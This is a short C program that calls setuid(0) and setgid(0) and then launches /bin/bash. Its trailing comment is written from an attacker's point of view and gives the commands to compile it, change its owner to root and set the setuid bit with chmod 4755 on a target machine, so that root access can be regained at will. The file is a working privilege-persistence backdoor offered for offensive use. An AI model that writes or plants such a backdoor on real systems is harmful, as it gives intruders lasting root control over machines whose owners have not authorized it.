int main (void)
{
	setuid(0);
	setgid(0);
	system("/bin/bash");
}
/*
On attacker machine before transfer:
	gcc SETUID_Bash.c -o SETUID_Bash
	chmod +x SETUID_Bash
Commands to be injected on target machine to execute this program as elevated privleges whenever we want.
	Chown root:root [compiled program path]
		- Or whatever UID:GID we elevate to.
	Chmod 4755 [compiled program path]
*/
